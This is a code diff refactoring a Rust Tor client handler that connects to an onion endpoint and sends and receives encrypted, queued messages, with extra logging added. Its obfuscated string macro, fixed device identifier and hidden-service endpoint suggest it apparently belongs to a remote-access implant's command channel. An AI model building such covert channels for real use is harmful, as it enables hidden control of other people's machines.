@@ -28,7 +28,7 @@ pub struct TrHandler {
     pub dv_id: RwPtr<String>,
     tr_clnt: MutexPtr<TorClient<tor_rtcompat::PreferredRuntime>>,
     stream_prefs: RwPtr<StreamPrefs>,
-    stream: Option<MutexPtr<DataStream>>,
+    stream: MutexPtr<Option<DataStream>>,
     send_queue: MutexPtr<SendQueue>,
     pub queue_tick_interval_ms: RwPtr<u64>,
     tcp_receive_poll_delay_ms: RwPtr<u64>,
@@ -71,7 +71,7 @@ impl TrHandler {
         stream_prefs.connect_to_onion_services(arti_client::config::BoolOrAuto::Explicit(true));
 
         let tor_handler = TrHandler {
-            stream: None,
+            stream: Arc::new(Mutex::new(None)),
             dv_id: Arc::new(RwLock::new(fetch_constant_device_id())),
             send_queue: Arc::new(Mutex::new(VecDeque::new())),
             logger: Arc::new(Mutex::new(logger)),
@@ -91,8 +91,8 @@ impl TrHandler {
         let stream = tor_client
             .connect_with_prefs((onion_endpoint(), 80), &stream_prefs).await
             .context(s!("Failed to connect to onion endpoint").to_string())?;
-
-        self.stream = Some(Arc::new(Mutex::new(stream)));
+        let mut stream_guard = self.stream.lock().await;
+        *stream_guard = Some(stream);
 
         Ok(())
     }
@@ -198,9 +198,11 @@ impl TrHandler {
     }
 
     async fn read_data(&self) -> Result<Vec<u8>> {
-        let read_stream_ref = self.get_stream()?;
+        let read_stream_ref = self.get_stream().await?;
 
-        let mut stream = read_stream_ref.lock().await;
+        let mut shell_guard = read_stream_ref.lock().await;
+        let stream = shell_guard.as_mut().unwrap();
+
         stream.wait_for_connection().await?;
 
         let data_length = match stream.read_u32_le().await {
@@ -227,11 +229,17 @@ impl TrHandler {
             interval.tick().await;
             let mut queue = self.send_queue.lock().await;
             while let Some(data) = queue.pop_front() {
-                if let Err(_error) = self.encrypt_and_send(&data).await {
+                ref_info!(
+                    self.logger.lock().await.as_ref().expect("no logger"),
+                    "QUEUE RECEIVED SENDING"
+                );
+
+                if let Err(error) = self.encrypt_and_send(&data).await {
                     // ref_err!(self.logger.lock().unwrap(), "Failed to encrypt_and_send");
                     ref_err!(
                         self.logger.lock().await.as_ref().expect("no logger"),
-                        "Failed to encrypt_and_send"
+                        "Failed to encrypt_and_send: ",
+                        error
                     );
                 }
             }
@@ -247,6 +255,10 @@ impl TrHandler {
             ::to_vec(&send)
             .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;
         self.send_queue.lock().await.push_back(binary_data);
+        ref_info!(
+            self.logger.lock().await.as_ref().expect("no logger"),
+            "added data to sent queue"
+        );
         Ok(())
     }
     async fn encrypt_and_send(&self, data: &[u8]) -> Result<()> {
@@ -257,16 +269,18 @@ impl TrHandler {
         self.send_data(&encrypted_data).await
     }
     async fn send_data(&self, data: &[u8]) -> Result<()> {
-        let read_stream_ref = self.get_stream()?;
-        let mut stream = read_stream_ref.lock().await;
+        let read_stream_ref = self.get_stream().await?;
+        let mut shell_guard = read_stream_ref.lock().await;
+        let stream = shell_guard.as_mut().unwrap();
         stream.write_all(data).await.context(s!("Failed to write to stream").to_string())?;
         stream.flush().await.context(s!("Failed to flush stream").to_string())?;
         Ok(())
     }
-    fn get_stream(&self) -> Result<MutexPtr<DataStream>> {
-        match &self.stream {
-            Some(stream) => Ok(stream.clone()),
-            None => { Err(anyhow::anyhow!(s!("Data Stream not initialized").to_string())) }
+    async fn get_stream(&self) -> Result<MutexPtr<Option<DataStream>>> {
+        if self.stream.lock().await.is_some() {
+            Ok(self.stream.clone())
+        } else {
+            Err(anyhow::anyhow!(s!("Data Stream not initialized").to_string()))
         }
     }
 }
